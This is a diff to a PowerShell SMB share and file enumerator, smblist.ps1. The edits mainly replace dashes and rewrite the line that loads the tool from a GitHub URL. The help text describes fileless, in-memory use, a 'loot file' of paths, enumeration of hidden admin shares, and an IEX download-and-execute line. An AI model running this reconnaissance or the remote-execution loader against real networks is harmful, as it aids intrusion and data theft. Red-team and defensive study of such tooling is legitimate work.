@@ -2,7 +2,7 @@ function Invoke-SMBList{
 [CmdletBinding()]
 param([switch]$h,[string[]]$Hosts,[string]$OutFile="smblist_$(Get-Date -f yyyyMMdd_HHmmss).txt",[int]$Depth=0,[switch]$IncludeHidden,[pscredential]$Credential,[switch]$InMemory)
 if($h){@'
-smblist.ps1 — native SMB share+file enumerator (full-depth, fileless-capable)
+smblist.ps1 - native SMB share+file enumerator (full-depth, fileless-capable)
 
 usage:
   Invoke-SMBList [options]
@@ -16,13 +16,13 @@ options:
   -Depth 3                  cap recursion (default: unlimited, like smbclient recurse;ls)
   -IncludeHidden            include C$/ADMIN$ style shares
   -Credential (psc 'CORP\jsmith' 'Passw0rd!')   alternate creds
-  -InMemory                 net view share enum — no csc.exe, nothing on disk
+  -InMemory                 net view share enum - no csc.exe, nothing on disk
   -OutFile ''               pipeline only, no loot file (default writes smblist_<timestamp>.txt)
   -Verbose                  show skips and denials
   -h                        this help
 
 load from URL (function only, then call it):
-  IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/USER/REPO/main/smblist.ps1')
+  IEX ([Text.Encoding]::UTF8.GetString((New-Object Net.WebClient).DownloadData('https://raw.githubusercontent.com/USER/REPO/main/smblist.ps1')))
   Invoke-SMBList -Hosts hosts.txt -InMemory -OutFile '' -Verbose
 
 examples:
@@ -54,11 +54,11 @@ foreach($h in $t){
   if(!(Test-Connection $h -Count 1 -Quiet -EA 0)){Write-Verbose "[-] $h unreachable";continue}
   if($cp){net use "\\$h\IPC$" /user:$($cp.UserName) $pw 2>&1|Out-Null}
   $sh=Shares $h
-  if($sh){"[+] $h — $($sh.Count) shares: $($sh -join', ')"|Write-Host -F Green
+  if($sh){"[+] $h - $($sh.Count) shares: $($sh -join', ')"|Write-Host -F Green
     foreach($s in $sh){$p=Walk $h $s;if($p){if($OutFile){$p|Add-Content $OutFile}else{$p};$f+=$p.Count}}}
   else{Write-Verbose "[-] $h no readable shares"}
   if($cp){net use "\\$h\IPC$" /delete /y 2>&1|Out-Null}}
-"[i] done — $f paths -> $(if($OutFile){$OutFile}else{'pipeline'})"|Write-Host -F Cyan
+"[i] done - $f paths -> $(if($OutFile){$OutFile}else{'pipeline'})"|Write-Host -F Cyan
 }
 function global:psc($u,$p){[pscredential]::new($u,(ConvertTo-SecureString $p -AsPlainText -Force))}
 if($PSCommandPath){Invoke-SMBList @args}
